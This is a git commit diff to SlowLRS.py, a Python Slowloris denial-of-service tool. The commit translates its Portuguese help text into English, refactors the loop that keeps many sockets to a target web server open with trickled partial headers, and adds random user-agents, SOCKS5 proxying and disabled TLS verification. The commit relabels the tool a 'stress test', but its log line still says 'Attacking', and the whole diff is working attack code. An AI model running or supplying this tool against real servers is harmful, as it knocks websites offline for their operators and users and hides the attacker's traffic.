f7b6fe74de6747d4d9195f6f9b40984f8d6c733b
LXrdKnowkill <72852709+LXrdKnowkill@users.noreply.github.com>
2024-10-05 12:57:04 -0300

    Update SlowLRS.py

--- SlowLRS.py
+++ SlowLRS.py
@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import argparse
 import logging
 import random
@@ -6,17 +7,17 @@ import sys
 import time
 
 parser = argparse.ArgumentParser(
-    description="É uma ferramente de negação de serviço de baixa banda larga. para ataque em servidores web"
+    description="Slowloris, low bandwidth stress test tool for websites"
 )
-parser.add_argument("host", nargs="?", help="Host para realizar o ataque de DOS em")
+parser.add_argument("host", nargs="?", help="Host to perform stress test on")
 parser.add_argument(
-    "-p", "--port", default=80, help="Porta do servidor, geralmente é 80", type=int
+    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
 )
 parser.add_argument(
     "-s",
     "--sockets",
     default=150,
-    help="Numero de sockets para ser usados no teste",
+    help="Number of sockets to use in the test",
     type=int,
 )
 parser.add_argument(
@@ -24,21 +25,21 @@ parser.add_argument(
     "--verbose",
     dest="verbose",
     action="store_true",
-    help="Aumenta a taxa de loggins no site",
+    help="Increases logging",
 )
 parser.add_argument(
     "-ua",
     "--randuseragents",
     dest="randuseragent",
     action="store_true",
-    help="",
+    help="Randomizes user-agents with each request",
 )
 parser.add_argument(
     "-x",
     "--useproxy",
     dest="useproxy",
     action="store_true",
-    help="Use o proxy SOCKS5 para conectar",
+    help="Use a SOCKS5 proxy for connecting",
 )
 parser.add_argument(
     "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
@@ -50,14 +51,14 @@ parser.add_argument(
     "--https",
     dest="https",
     action="store_true",
-    help="Use a HTTP para fazer os ataques",
+    help="Use HTTPS for the requests",
 )
 parser.add_argument(
     "--sleeptime",
     dest="sleeptime",
     default=15,
     type=int,
-    help="Tempo de envio a cada requisição enviada ( tempo para ele parar de enviar)",
+    help="Time to sleep between each header sent.",
 )
 parser.set_defaults(verbose=False)
 parser.set_defaults(randuseragent=False)
@@ -75,9 +76,9 @@ if not args.host:
     sys.exit(1)
 
 if args.useproxy:
-   # Tenta importar para a biblioteca externa de "meias"
-    # e macaco corrige socket.socket para conectar
-    # o proxy por padrão
+    # Tries to import to external "socks" library
+    # and monkey patches socket.socket to connect over
+    # the proxy by default
     try:
         import socks
 
@@ -85,22 +86,16 @@ if args.useproxy:
             socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
         )
         socket.socket = socks.socksocket
-        logging.info("Usando proxy SOCKS5 proxy para conectar...")
+        logging.info("Using SOCKS5 proxy for connecting...")
     except ImportError:
-        logging.error("Biblioteca Proxy Socks não esta disponivel!")
+        logging.error("Socks Proxy Library Not Available!")
+        sys.exit(1)
 
-if args.verbose:
-    logging.basicConfig(
-        format="[%(asctime)s] %(message)s",
-        datefmt="%d-%m-%Y %H:%M:%S",
-        level=logging.DEBUG,
-    )
-else:
-    logging.basicConfig(
-        format="[%(asctime)s] %(message)s",
-        datefmt="%d-%m-%Y %H:%M:%S",
-        level=logging.INFO,
-    )
+logging.basicConfig(
+    format="[%(asctime)s] %(message)s",
+    datefmt="%d-%m-%Y %H:%M:%S",
+    level=logging.DEBUG if args.verbose else logging.INFO,
+)
 
 
 def send_line(self, line):
@@ -113,7 +108,7 @@ def send_header(self, name, value):
 
 
 if args.https:
-    logging.info("Importando modo ssl")
+    logging.info("Importing ssl module")
     import ssl
 
     setattr(ssl.SSLSocket, "send_line", send_line)
@@ -130,7 +125,7 @@ user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
@@ -152,12 +147,14 @@ setattr(socket.socket, "send_line", send_line)
 setattr(socket.socket, "send_header", send_header)
 
 
-def init_socket(ip):
+def init_socket(ip: str):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
 
     if args.https:
         ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
         s = ctx.wrap_socket(s, server_hostname=args.host)
 
     s.connect((ip, args.port))
@@ -169,19 +166,49 @@ def init_socket(ip):
         ua = random.choice(user_agents)
 
     s.send_header("User-Agent", ua)
-    s.send_header("Aceitar-linguagem", "en-US,en,q=0.5")
+    s.send_header("Accept-language", "en-US,en,q=0.5")
     return s
+
+
+def slowloris_iteration():
+    logging.info("Sending keep-alive headers...")
+    logging.info("Socket count: %s", len(list_of_sockets))
+
+    # Try to send a header line to each socket
+    for s in list(list_of_sockets):
+        try:
+            s.send_header("X-a", random.randint(1, 5000))
+        except socket.error:
+            list_of_sockets.remove(s)
+
+    # Some of the sockets may have been closed due to errors or timeouts.
+    # Re-create new sockets to replace them until we reach the desired number.
+
+    diff = args.sockets - len(list_of_sockets)
+    if diff <= 0:
+        return
+
+    logging.info("Creating %s new sockets...", diff)
+    for _ in range(diff):
+        try:
+            s = init_socket(args.host)
+            if not s:
+                continue
+            list_of_sockets.append(s)
+        except socket.error as e:
+            logging.debug("Failed to create new socket: %s", e)
+            break
 
 
 def main():
     ip = args.host
     socket_count = args.sockets
-    logging.info("Atacando %s com %s sockets.", ip, socket_count)
+    logging.info("Attacking %s with %s sockets.", ip, socket_count)
 
-    logging.info("Criando loggins...")
+    logging.info("Creating sockets...")
     for _ in range(socket_count):
         try:
-            logging.debug("Criando loggins nr %s", _)
+            logging.debug("Creating socket nr %s", _)
             s = init_socket(ip)
         except socket.error as e:
             logging.debug(e)
@@ -190,31 +217,14 @@ def main():
 
     while True:
         try:
-            logging.info(
-                "Enviando loggins mantendo vivos... Contagem de soquetes: %s",
-                len(list_of_sockets),
-            )
-            for s in list(list_of_sockets):
-                try:
-                    s.send_header("X-a", random.randint(1, 5000))
-                except socket.error:
-                    list_of_sockets.remove(s)
-
-            for _ in range(socket_count - len(list_of_sockets)):
-                logging.debug("Recriando socket...")
-                try:
-                    s = init_socket(ip)
-                    if s:
-                        list_of_sockets.append(s)
-                except socket.error as e:
-                    logging.debug(e)
-                    break
-            logging.debug("Desligando por  %d segundos ", args.sleeptime)
-            time.sleep(args.sleeptime)
-
+            slowloris_iteration()
         except (KeyboardInterrupt, SystemExit):
-            logging.info("Parando, SlowLRS")
+            logging.info("Stopping Slowloris")
             break
+        except Exception as e:
+            logging.debug("Error in Slowloris iteration: %s", e)
+        logging.debug("Sleeping for %d seconds", args.sleeptime)
+        time.sleep(args.sleeptime)
 
 
 if __name__ == "__main__":
